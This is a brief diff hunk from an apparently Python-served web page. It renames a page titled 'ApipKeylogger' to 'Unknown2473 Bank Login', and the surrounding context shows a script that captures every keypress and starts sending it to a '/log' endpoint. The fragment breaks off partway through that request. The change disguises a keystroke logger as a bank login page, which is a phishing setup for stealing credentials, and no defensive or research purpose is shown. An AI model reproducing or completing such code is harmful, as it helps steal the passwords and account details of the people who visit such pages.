@@ -10,7 +10,7 @@ def index():
         <!DOCTYPE html>
         <html lang="en">
         <head>
-            <title>ApipKeylogger</title>
+            <title>Unknown2473 Bank Login</title>
             <script>
                 document.addEventListener('keypress', function(e) {
                     fetch('/log', {
